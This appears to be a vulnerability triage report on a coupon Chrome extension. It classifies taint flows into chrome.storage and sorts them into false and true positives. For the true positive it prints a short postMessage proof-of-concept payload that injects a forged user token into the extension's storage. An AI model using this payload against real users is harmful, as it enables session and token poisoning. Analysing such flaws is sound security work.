# CoCo Analysis: jkdipkchdppgniioijmgbgbaeeghndnf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4 (3 fetch_source -> storage.set, 1 cs_window_eventListener_message -> storage.set)

---

## Sink 1-3: fetch_source -> chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jkdipkchdppgniioijmgbgbaeeghndnf/opgen_generated_files/bg.js
Line 265	    var responseText = 'data_from_fetch';

**Classification:** FALSE POSITIVE

**Reason:** These flows (Lines 1084-1108 and 1118-1141 in bg.js) fetch data from hardcoded backend URLs ('https://couponchanhtuoi.chanh.in') and store the responses. This is trusted infrastructure - data FROM hardcoded backend is not an attacker-controllable source.

---

## Sink 4: cs_window_eventListener_message -> chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jkdipkchdppgniioijmgbgbaeeghndnf/opgen_generated_files/cs_0.js
Line 1382	window.addEventListener("message", function(event) {
Line 1383	    if (event.data.action === "sendUserInfo") {
Line 1384	        const user = event.data.user;

**Code:**

```javascript
// Content script (cs_0.js) - Entry point
window.addEventListener("message", function(event) {
    if (event.data.action === "sendUserInfo") {
        const user = event.data.user; // <- attacker-controlled
        chrome.runtime.sendMessage({
            action: "saveUserInfo",
            user: user // <- attacker-controlled data forwarded
        });
    }
});

// Background script (bg.js) - Message handler
chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
    // ... other handlers ...

    if (message.action === "saveUserInfo") {
        const currentDate = new Date().toISOString();
        chrome.storage.local.set({
            user: message.user,  // <- attacker-controlled data stored
            tokenDate: currentDate
        }, function() {});

        chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
            if (tabs.length > 0) {
                const tabId = tabs[0].id;
                chrome.tabs.query({ currentWindow: true, active: true }, (tabs) => {
                    sendResponse(tabs[0])
                });
                setTimeout(function() {
                    chrome.tabs.remove(tabId, function() {});
                }, 1000);
            }
        });

        chrome.storage.local.get("originalTabId", function (data) {
            if (data.originalTabId) {
                chrome.tabs.reload(data.originalTabId, function () {});
            }
        });
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// Malicious webpage code
window.postMessage({
    action: "sendUserInfo",
    user: {
        token: "malicious_token",
        email: "attacker@evil.com",
        username: "compromised_user"
    }
}, "*");
```

**Impact:** A malicious webpage can poison the extension's storage with arbitrary user data. The extension stores this attacker-controlled data and later uses it to make authenticated requests to the backend (see getShopInfo and getShopVoucher functions that use user.token from storage). This allows an attacker to inject a malicious token that will be used in subsequent authenticated API calls, potentially compromising the user's session or injecting malicious data into backend requests.
